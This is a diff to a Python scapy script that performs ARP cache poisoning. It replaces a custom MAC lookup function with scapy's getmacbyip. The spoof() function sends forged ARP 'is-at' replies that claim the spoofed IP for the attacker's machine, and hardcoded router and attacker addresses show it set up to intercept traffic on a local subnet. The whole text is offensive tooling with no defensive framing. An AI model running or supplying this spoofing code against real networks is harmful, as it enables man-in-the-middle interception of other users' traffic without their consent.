@@ -1,6 +1,6 @@
 #/usr/bin/env python
 # Rebuild
-from scapy.layers.l2 import ARP, Ether
+from scapy.layers.l2 import ARP, Ether, getmacbyip
 import scapy.all as scapy
 import time
 import sys
@@ -13,20 +13,9 @@ router_ip = "192.168.63.2"
 router_mac = "00-0c-29-fe-37-29"
 my_ip = "192.168.63.139"
 
-def get_mac(ip):
-	arp_request = ARP(pdst=ip)
-	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-	broadcast_arp_request = broadcast/arp_request
-	answered_list = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
-	if len(answered_list) > 0:
-		return answered_list[0][1].hwsrc
-	else:
-		return None
-
 check_port_forwarding()
-
 def spoof(target_ip, spoof_ip):
-	target_mac = get_mac(target_ip)
+	target_mac = getmacbyip(target_ip)
 	# pkt1 = ARP(op="is-at", psrc=router_ip, hwsrc=router_mac, pdst=victim_ip, hwdst=victim_mac)
 	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
 	scapy.send(packet, verbose=False)
